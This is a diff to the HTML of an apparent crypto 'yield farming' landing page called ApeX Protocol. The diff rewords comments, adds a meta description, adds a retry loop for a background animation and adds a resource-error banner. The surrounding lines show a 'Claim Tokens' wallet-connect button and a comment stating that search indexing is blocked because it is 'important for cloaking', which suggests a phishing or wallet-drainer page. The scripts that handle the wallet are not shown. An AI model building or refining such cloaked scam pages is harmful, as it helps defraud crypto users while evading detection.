@@ -5,17 +5,18 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="description" content="ApeX Protocol – AI-optimized yield farming with advanced security and predictive analytics." />
 
     <!-- Prevent search engines from indexing this page (important for cloaking) -->
     <meta name="robots" content="noindex, nofollow" />
-    <!-- Force no caching to ensure fresh content every time -->
+    <!-- Force no caching -->
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
     <meta http-equiv="Pragma" content="no-cache" />
     <meta http-equiv="Expires" content="0" />
 
     <title>ApeX Protocol | AI-Optimized Yield Farming</title>
 
-    <!-- Preload critical assets for better performance -->
+    <!-- Preload critical assets -->
     <link rel="preload" href="NFT_IMAGE/ChatGPT Image Nov 7, 2025, 10_47_13 AM.png" as="image" />
     <link rel="preconnect" href="https://cdnjs.cloudflare.com" />
 
@@ -175,7 +176,7 @@
 
                         <!-- Claim Actions -->
                         <div class="claim-actions">
-                            <!-- If you use AppKit, ensure it's loaded; otherwise remove this line -->
+                            <!-- If you use AppKit, uncomment the next line and load the library -->
                             <!-- <w3m-button></w3m-button> -->
                             <button class="btn-primary" id="connectButton">
                                 <i class="fas fa-hand-holding-heart"></i> Claim Tokens
@@ -326,7 +327,7 @@
     <script type="module" src="./Java/Script.js" defer></script>
     <script type="module" src="./Java/main.js" defer></script>
 
-    <!-- Vanta initialization with retry -->
+    <!-- Vanta initialization with robust retry -->
     <script>
         (function initVanta() {
             if (document.readyState === 'loading') {
@@ -354,7 +355,18 @@
                     console.error('Vanta init error:', e);
                 }
             } else {
-                setTimeout(initVanta, 300);
+                // Retry every 200ms until Vanta is available (max 50 attempts)
+                let attempts = 0;
+                const interval = setInterval(() => {
+                    attempts++;
+                    if (typeof VANTA !== 'undefined' && VANTA.NET) {
+                        clearInterval(interval);
+                        initVanta();
+                    } else if (attempts > 50) {
+                        clearInterval(interval);
+                        console.warn('Vanta failed to load after 10 seconds');
+                    }
+                }, 200);
             }
         })();
     </script>
@@ -365,5 +377,27 @@
             JavaScript is required to use this site. Please enable JavaScript in your browser settings.
         </div>
     </noscript>
+
+    <!-- Optional: Display resource loading errors (helpful for debugging) -->
+    <script>
+        window.addEventListener('error', function(e) {
+            if (e.target && (e.target.tagName === 'SCRIPT' || e.target.tagName === 'LINK')) {
+                console.error('Failed to load resource:', e.target.src || e.target.href);
+                // You could also show a small warning to the user
+                const errorDiv = document.createElement('div');
+                errorDiv.style.position = 'fixed';
+                errorDiv.style.bottom = '10px';
+                errorDiv.style.right = '10px';
+                errorDiv.style.background = '#ff4444';
+                errorDiv.style.color = 'white';
+                errorDiv.style.padding = '5px 10px';
+                errorDiv.style.borderRadius = '5px';
+                errorDiv.style.zIndex = '10000';
+                errorDiv.textContent = 'Some resources failed to load. Check console.';
+                document.body.appendChild(errorDiv);
+                setTimeout(() => errorDiv.remove(), 5000);
+            }
+        }, true);
+    </script>
 </body>
 </html>
